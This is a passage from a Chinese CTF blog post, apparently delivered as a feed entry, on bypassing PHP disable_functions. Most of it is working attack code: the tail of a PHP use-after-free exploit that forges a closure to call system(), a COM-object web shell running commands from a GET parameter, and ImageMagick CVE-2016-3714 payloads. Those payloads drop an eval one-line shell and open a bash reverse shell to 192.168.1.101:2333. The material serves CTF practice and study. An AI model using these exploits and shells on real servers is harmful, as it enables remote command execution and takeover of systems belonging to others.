class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">'WIN'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'This PoC is for *nix systems only.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">'x'</span>);</span><br><span class="line">    $abc = $backtrace[<span class="number">1</span>][<span class="string">'args'</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"UAF failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't determine binary base address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't parse ELF header"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get basic_functions address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get zif_system address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="COM"><a href="#COM" class="headerlink" title="COM"></a>COM</h1><p>window下的组件，开启组件（php5.4以上），开启com.allow_dcom = true，添加extension=php_com_dotnet.dll</p><p><img src="../../images/ctf/ctfhub/3.png" alt=""><br>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>); <span class="comment">// 生成一个COM对象　Shell.Application也能</span></span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">"cmd /c"</span>.$command); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/ctf/ctfhub/4.png" alt=""></p><h1 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h1><p>imagemagick是一个用于处理图片的程序，如果上传的图片含有攻击代码，在处理时可被远程执行任意代码（CVE-2016–3714）<br>写一句话到网站根目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill <span class="string">'url(https://example.com/1.jpg"|echo \'</span>&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[\<span class="string">'ant\'</span>]);?&gt;\<span class="string">' &gt; shell.php")'</span></span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>反弹 shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill <span class="string">'url(https://example.com/1.jpg"|bash -i &gt;&amp; /dev/tcp/192.168.1.101/2333 0&gt;&amp;1")'</span></span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>参考文章：<br><a href="https://writeup.ctfhub.com/Skill/Web%E8%BF%9B%E9%98%B6/PHP/Bypass-disable-function/3d4335ed.html" target="_blank" rel="noopener">https://writeup.ctfhub.com/Skill/Web%E8%BF%9B%E9%98%B6/PHP/Bypass-disable-function/3d4335ed.html</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/109078117" target="_blank" rel="noopener">https://blog.csdn.net/rfrder/article/details/109078117</a> </p><p><a href="https://www.anquanke.com/post/id/208451" target="_blank" rel="noopener">https://www.anquanke.com/post/id/208451</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;PHP 的 disable_functions 用于禁用一些危险的函数避免被攻击者利用  &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
</feed>
